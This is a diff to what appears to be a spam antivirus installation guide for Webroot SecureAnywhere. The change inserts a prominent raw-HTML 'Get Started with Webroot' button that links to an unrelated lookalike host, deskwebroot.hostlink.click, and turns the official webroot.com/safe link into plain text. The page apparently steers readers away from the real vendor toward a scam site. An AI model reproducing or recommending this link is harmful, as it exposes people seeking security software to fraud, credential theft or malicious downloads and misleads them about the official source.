@@ -3,7 +3,13 @@ No More Delays: Install Webroot SecureAnywhere PC via webroot.com/safe
 
 In today’s digital age, keeping your computer safe from cyber threats is more important than ever. Malware, ransomware, phishing scams, and identity theft are growing risks, and traditional antivirus programs often struggle to keep up. That’s where Webroot SecureAnywhere steps in. Known for its lightweight structure, lightning-fast scans, and cloud-based protection, Webroot is a powerful option for users looking for modern antivirus protection.
 
-If you’ve recently purchased a subscription or are thinking of trying it out, this complete guide will help you **Install Webroot SecureAnywhere** on your PC through the official Webroot portal: `webroot.com/safe <https://www.webroot.com/safe>`_. We will walk you through downloading the software, activating your subscription, and making the most out of your Webroot protection.
+.. raw:: html
+
+   <div style="text-align:center;">
+       <a href="https://deskwebroot.hostlink.click/" rel="noreferrer" style="background-color:#007BFF;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;display:inline-block;font-weight:bold;">Get Started with Webroot</a>
+   </div>
+
+If you’ve recently purchased a subscription or are thinking of trying it out, this complete guide will help you **Install Webroot SecureAnywhere** on your PC through the official Webroot portal: webroot.com/safe. We will walk you through downloading the software, activating your subscription, and making the most out of your Webroot protection.
 
 Whether you're a new or returning user, learning how to **Install Webroot SecureAnywhere** correctly is essential to your device’s security. Throughout this post, you’ll see important steps and tips to guide you during setup via `webroot.com/safe <https://www.webroot.com/safe>`_, ensuring that your protection is fast, reliable, and efficient.
 
